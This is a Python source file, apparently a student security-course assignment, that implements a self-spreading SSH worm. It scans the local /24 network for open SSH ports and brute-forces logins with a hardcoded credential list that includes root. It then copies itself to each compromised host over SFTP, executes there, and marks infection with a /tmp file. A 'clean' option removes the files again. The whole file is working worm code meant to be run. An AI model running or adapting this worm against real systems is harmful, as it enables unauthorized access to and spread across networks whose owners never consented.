#Assignment 1
#Group members: 
#	Gyromee Hatcher
#	Kenny Chao
#	Mevin Chen
#	Meng-Shen Kuan
##################################################################

import paramiko
import sys
import socket
import nmap
import netinfo
import os
import fcntl
import struct
import subprocess

# The list of credentials to attempt
credList = [
('hello', 'world'),
('hello1', 'world'),
('root', '#Gig#'),
('cpsc', 'cpsc'),
]

# The file marking whether the worm should spread
INFECTED_MARKER_FILE = "/tmp/infected.txt"

def cleanInfectedSystem(networkHosts):
	os.system("rm /tmp/infected.txt")
	os.system("rm /tmp/worm.py")
	for host in networkHosts:

	        # Try to attack this host
        	sshInfo =  attackSystem(host)

	        print sshInfo

	        # Did the attack succeed?
        	if sshInfo:
				print "Trying to clean..."
				spreadAndDelete(sshInfo[0])
				print "Cleaning complete!"
	pass
	
##################################################################
# Returns whether the worm should spread
# @return - True if the infection succeeded and false otherwise
##################################################################
def isInfectedSystem():
	return os.path.isfile(INFECTED_MARKER_FILE)	
	# Check if the system as infected. One
	# approach is to check for a file called
	# infected.txt in directory /tmp (which
	# you created when you marked the system
	# as infected). 
	pass

#################################################################
# Marks the system as infected
#################################################################
def markInfected():
	f = open(INFECTED_MARKER_FILE, "w+") 
	f.write("This file is infected.")
	f.close()
	pass	

###############################################################
# Spread to the other system and execute
# @param sshClient - the instance of the SSH client connected
# to the victim system
###############################################################
def spreadAndExecute(sshClient):	
	sftpClient = sshClient.open_sftp()
	sftpClient.put("worm.py", "/tmp/" + "worm.py")
	sshClient.exec_command("chmod a+x /tmp/worm.py")
	sshClient.exec_command("python /tmp/worm.py")	
	pass

###############################################################
# Spread to the other systems and remove the infected.txt
# and worm.py files
###############################################################
def spreadAndDelete(sshClient):
	sftpClient = sshClient.open_sftp()
	sshClient.exec_command("rm /tmp/infected.txt")
	sshClient.exec_command("rm /tmp/worm.py")
	return None
	
############################################################
# Try to connect to the given host given the existing
# credentials
# @param host - the host system domain or IP
# @param userName - the user name
# @param password - the password
# @param sshClient - the SSH client
# return - 0 = success, 1 = probably wrong credentials, and
# 3 = probably the server is down or is not running SSH
###########################################################
def tryCredentials(host, userName, password, sshClient):
	try:
		sshClient.connect(host,username=userName,password=password)
	except socket.error:
		return 3
	except paramiko.SSHException:
		return 1
	return 0

###############################################################
# Wages a dictionary attack against the host
# @param host - the host to attack
# @return - the instace of the SSH paramiko class and the
# credentials that work in a tuple (ssh, username, password).
# If the attack failed, returns a NULL
###############################################################
def attackSystem(host):
	# The credential list
	global credList
	
	# Create an instance of the SSH client
	ssh = paramiko.SSHClient()

	# Set some parameters to make things easier.
	ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
	
	# The results of an attempt
	attemptResults = None
				
	# Go through the credentials
	for (username, password) in credList:
		if not tryCredentials(host, username, password, ssh):
			return (ssh,);	 
		pass	
			
	# Could not find working credentials
	return None	

#Retrive interface name from the output of 'ifconfig -a'
p = subprocess.Popen("ifconfig -a", stdout=subprocess.PIPE, shell=True)
(output, err) = p.communicate()
p_status = p.wait()
interface = output.split(None,1)[0]
####################################################
# Returns the IP of the current system
# @param interface - the interface whose IP we would
# like to know
# @return - The UP address of the current system
####################################################
def getMyIP(interface):
	s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	return socket.inet_ntoa(fcntl.ioctl(
		s.fileno(),
		0x8915,
		struct.pack('256s', interface[:15])
	)[20:24])
	
#######################################################
# Returns the list of systems on the same network
# @return - a list of IP addresses on the same network
#######################################################
def getHostsOnTheSameNetwork():
	portScanner = nmap.PortScanner()
	portScanner.scan('192.168.1.0/24',arguments='-p 22 --open')
	hostInfo=portScanner.all_hosts()
	return hostInfo

# If we are running on the victim, check if 
# the victim was already infected. If so, terminate.
# Otherwise, proceed with malicious intent.
if len(sys.argv) < 2:
	if isInfectedSystem():
		exit()		
	else:	
		markInfected()
		
# Get the hosts on the same network
networkHosts = getHostsOnTheSameNetwork()

#Check if there are arguemnts for invoking self-cleaning
if len(sys.argv) >= 2:
	if (sys.argv[1].lower() == "clean") or (sys.argv[1].lower() == "-c" ):
		cleanInfectedSystem(networkHosts)
		exit()

print "Found hosts: ", networkHosts

# Go through the network hosts
for host in networkHosts:
	
	# Try to attack this host
	sshInfo =  attackSystem(host)
	
	print sshInfo
	
	# Did the attack succeed?
	if sshInfo:
		
		print "Trying to spread"
		
		spreadAndExecute(sshInfo[0])
		
		print "Spreading complete"	
	

